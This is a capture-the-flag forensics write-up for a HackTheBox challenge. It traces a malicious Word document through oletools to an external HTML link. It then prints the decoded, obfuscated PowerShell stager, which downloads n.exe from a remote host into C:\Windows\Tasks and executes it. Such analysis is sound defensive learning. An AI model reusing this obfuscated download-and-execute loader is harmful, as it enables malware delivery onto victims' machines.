# Write-up :Diagnotic
* *1.Given a host which we can use to retrieve the doc file .download the doc with wget :wget IP/layoffs.doc* 
* *2.use `oleid` on the document found an External Relationships* 
* *3.use `oleobj` for details* 
* *4.Found relationship 'oleObject' with external link http://diagnostic.htb:32218/223_index_style_fancy.html!* 
* *5.download the html file with wget :wget IP/223_index_style_fancy.html!* 
* *6. find two base64 chunk in html inside a script tag the first one contain a powershell script :* 
```python
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
```

* *7.the `file` variable is the **flag** just take the first line to a power shell or reorder the string and you get the flag:* 

flag : HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}
